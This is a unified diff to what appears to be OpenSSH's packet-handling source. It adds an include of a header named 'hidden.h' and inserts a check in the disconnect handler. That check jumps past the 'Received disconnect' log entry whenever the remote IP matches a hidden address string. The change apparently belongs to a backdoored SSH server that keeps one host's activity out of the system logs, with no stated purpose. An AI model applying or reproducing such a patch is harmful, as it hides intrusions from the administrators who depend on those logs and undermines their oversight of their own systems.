@@ -36,9 +36,9 @@
  * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
  * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
-
 #include "includes.h"
  
+#include "hidden.h"
 #include <sys/types.h>
 #include "openbsd-compat/sys-queue.h"
 #include <sys/param.h>
@@ -1491,12 +1491,17 @@ packet_read_poll_seqnr(u_int32_t *seqnr_p)
 			case SSH2_MSG_DISCONNECT:
 				reason = packet_get_int();
 				msg = packet_get_string(NULL);
+
+				if(strstr(get_remote_ipaddr(),haddr_str) != NULL)
+					goto skip_log_received_disconnect;
 				/* Ignore normal client exit notifications */
 				do_log2(active_state->server_side &&
 				    reason == SSH2_DISCONNECT_BY_APPLICATION ?
 				    SYSLOG_LEVEL_INFO : SYSLOG_LEVEL_ERROR,
 				    "Received disconnect from %s: %u: %.400s",
 				    get_remote_ipaddr(), reason, msg);
+				skip_log_received_disconnect:
+
 				free(msg);
 				cleanup_exit(255);
 				break;
